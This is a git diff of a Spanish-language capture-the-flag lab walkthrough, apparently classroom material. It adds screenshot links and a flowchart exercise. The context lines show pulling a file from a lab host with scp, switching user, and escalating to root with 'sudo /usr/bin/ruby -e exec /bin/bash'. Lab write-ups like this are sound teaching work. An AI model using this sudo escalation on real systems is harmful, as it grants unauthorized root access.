@@ -90,12 +90,12 @@ Para descargarlo lo realizaremos mediante scp como:
 ```bash
  scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor
 ```
-IMaGEN SCP
+![](scp.jpg)
 
 
 La imagen descargada es la siguiente:
 
-FOTO
+![](foto.jpg)
 
 ## Con file identificamos el tipo de fichero.
 
@@ -126,6 +126,8 @@ su oscar
 
 Con `sudo -l` vemos que tenemos acceso a la consola de **ruby** y la ejecutamos:
 
+![](sudo.jpg)
+
 ```bash
 sudo /usr/bin/ruby -e 'exec "/bin/bash"'
 ```
@@ -135,10 +137,12 @@ Finalmente hacemos un:
 ```bash
 whoami
 ```
+![](root.jpg)
 
 # Taller Individual.
 
 1. ReAlizar una investigación individual de cada una de las herramientas empleadas. Sintetice el resultado  mediante un cuadro que explique su definición, funcionalidad y casos de uso.
 
 2. Explicar en detalle cada uno de los comandos empleados realizando un desglose del mismo y citando al menos tres alternativas (si aplica) de variantes del comando.
+3. Realice un diagrama de flujo de todo el procedimiento realizado.
 
